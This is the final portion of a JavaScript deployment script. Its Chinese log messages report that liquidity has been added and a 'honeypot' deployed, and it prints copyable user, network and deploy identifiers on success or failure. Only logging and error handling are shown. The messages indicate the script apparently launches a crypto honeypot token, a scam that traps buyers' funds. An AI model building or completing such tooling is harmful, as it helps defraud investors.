    console.log("\n✅ 流动性添加和蜜罐部署完成");
    console.log("💡 提示: 请使用 simulateController.js 进行交易模拟");
    
    // 打印结尾可复制信息
    console.log("\n══════════════════════════════════════════════");
    console.log("✅ 流动性添加完成! 可复制信息:");
    console.log(`${userId} ${network} ${deployId}`);
    console.log("══════════════════════════════════════════════");

  } catch (err) {
    console.error("\n❌ 交易失败详情:", {
      message: err.message,
      code: err.code,
      data: err.data
    });
    
    // 打印结尾可复制信息（失败时）
    console.log("\n══════════════════════════════════════════════");
    console.log("❌ 添加流动性失败! 可复制信息:");
    console.log(`${userId} ${network} ${deployId}`);
    console.log("══════════════════════════════════════════════");
    
    throw err;
  }
}

main().catch(err => {
  console.error("❌ 脚本执行失败:", err);
  
  // 在全局错误时也打印可复制信息
  console.log("\n══════════════════════════════════════════════");
  console.log("❌ 全局错误! 可复制信息:");
  console.log(`${process.argv[2]} ${process.argv[3]} ${process.argv[4]}`);
  console.log("══════════════════════════════════════════════");
  
  process.exit(1);
});